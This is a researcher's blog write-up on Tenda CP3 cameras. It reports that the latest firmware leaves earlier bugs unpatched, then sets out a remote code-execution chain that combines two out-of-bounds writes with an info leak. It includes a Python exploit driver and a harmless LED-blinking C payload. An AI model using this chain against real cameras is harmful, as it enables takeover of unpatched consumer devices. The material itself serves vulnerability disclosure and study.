# Patched?

I connected a camera to the Internet, and upgraded one of the Tenda CP3 cameras to the latest firmware at the time of writing (*2311090948*). I'll try and crash the camera with each of the bugs, and anything that doesn't crash I'll take a peek at the binaries and see how they have patched it.

After looking at the 'patches', it looks like they haven't really intentionally patched much? They haven't even patched the CVEs that are public. They've just removed a couple of handlers and tweaked the '!' handler a bit - this is definitely the latest available update for my camera...

The latest firmware also exposes port *6688*, which is apparently for ONVIF? It is a *goahead* HTTP server, I'll leave it for someone else to look at as I should have enough here to do what I want.

# Exploit

I know that there are a million command injections, script injections, etc, but I haven't seen an exploit on this camera that is a memory corruption. Also, I have never found a nice array-based OOB-write in the wild before either, so lets exploit that!

This camera has pretty much 0 mitigations, so we can really easily throw together an exploit, we just need two things:
- Memory to put payload (known address)
- Execution Primitive

![options.jpg](/assets/images/tenda_cam/p3/options.jpg)

I'm going to be focusing on the **apollo** binary as this seems to be the 'main' binary that handles most of the camera functionality, so getting code execution within this process will likely give us the best access to camera features.

The OOB-write in the **write_cqp_delta** handler on port 8699 can be used to patch a global that stores a function pointer, we can overwrite it with a pointer to memory we control, and we can then call it with the **user** command on port 9876

Now to get our code into memory, I did consider using global regions at a known location, but the buffers were quite small, so I opted for a different approach:

- Use the port 9876 **upgrade** OOB-write to write a large chunk of data at the end of a memory region prior to the mapped **/dev/mem** region (the **rwx** memory region immediately prior to the intended address to write, the **/dev/mem** region)
- Use the port 9876 integer overflow -> remote info leak bug to leak the address of the mapped **/dev/mem** region which gets left in the heap after we trigger the OOB-write

After this, we have a large chunk of memory in an executable region, and we know the location of it!

![memory_layout.png](/assets/images/tenda_cam/p3/memory_layout.png)

Here is the **maps** file for the process after the OOB-write:

![mapped_dev_mem.png](/assets/images/tenda_cam/p3/mapped_dev_mem.png)

And here is the leaked pointer recovered from the OOB-read result (the surrounding memory is identical so it is easy to find the pointer as long as you read enough memory):

![leaked_dev_mem.png](/assets/images/tenda_cam/p3/leaked_dev_mem.png)

Now it is just a matter of chucking in a compiled C payload at the end of the heap region, using the leaked pointer to work out where it is, patching the address of the **user** function to be this location, and sending the **user** command to execute it!

```python
client_8699 = Client8699(args.host)
client_9876 = Client9876(args.host)

with open('stage1/payload.bin', 'rb') as f:
    payload = f.read()

    # do the OOB write to get code into memory, and get /dev/mem pointer in the heap
    result = client_9876.exploit_oob_write(payload)

    # use the integer overflow to leak back /dev/mem address
    result = client_9876.exploit_oob_read()

    # extract the /dev/mem address
    leaked_pointer = leak_dev_mem_pointer()

    print(f"Location of payload: {leaked_pointer - 0x1000}")

    # do oob write to patch the user function address to global data
    client_8699.set_human_thresh_oob_write(0x566d84, leaked_pointer - 0x1000)

    # trigger the patched user function
    client_9876.call_user_function()
```

## Flashing Lights

To do something mildly interesting with this, I opted to mess with the lights on the front of the camera (I've already done a stream hijack before - [check that out here](http://localhost:3000/camera)).

There is a script called **light.sh** which is used to interact with the GPIO registers that control the lights:

```bash
#!/bin/sh

if [ "$1" = "power_on" ] ; then
        echo gpio 25 wave 0 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 1 100 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "wifi_nocfg" ] ; then
    echo gpio 25 wave 1 200 0 200 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 0 100 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "upgrade" ] ; then
        echo gpio 25 wave 1 1000 0 1000 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 0 100 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "wifi_linking" ] ; then
        echo gpio 25 wave 0 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 1 200 0 200 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "server_online" ] ; then
        echo gpio 25 wave 1 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 0 100 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "server_offline" ] ; then
        echo gpio 25 wave 0 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 1 1000 0 1000 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "factory_test" ] ; then
        echo gpio 25 wave 1 500 0 2500 repeat 0 > /proc/driver/gpiowave
        sleep 1
        echo gpio 27 wave 1 500 0 2500 repeat 0 > /proc/driver/gpiowave
        sleep 1
        echo gpio 28 wave 1 500 0 2500 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "factory_ok" ] ; then
        echo gpio 25 wave 0 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 0 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 28 wave 0 100 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "reset" ] ; then
    echo gpio 25 wave 1 200 0 200 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 0 100 repeat 0 > /proc/driver/gpiowave
elif [ "$1" = "led_off" ] ; then
    echo gpio 25 wave 0 100 repeat 0 > /proc/driver/gpiowave
        echo gpio 27 wave 0 100 repeat 0 > /proc/driver/gpiowave
fi
```

So using this as a template, I wrote a quick payload that flickers each of the lights for 5 seconds to demonstrate that we have code execution in the **apollo** binary:

```c
#include <stdint.h>
#include "payload.h"

__attribute__((section(".text._start")))
int _start() {
    system_t system = (system_t) SYSTEM_ADDRESS;
    sleep_t sleep = (sleep_t) SLEEP_ADDRESS;

    system("echo gpio 25 wave 1 50 0 50 repeat 0 >/proc/driver/gpiowave");
    system("echo gpio 27 wave 1 50 0 50 repeat 0 >/proc/driver/gpiowave");
    system("echo gpio 28 wave 1 50 0 50 repeat 0 >/proc/driver/gpiowave");
    sleep(5);
    system("light.sh factory_ok");

    return 0;
}
```
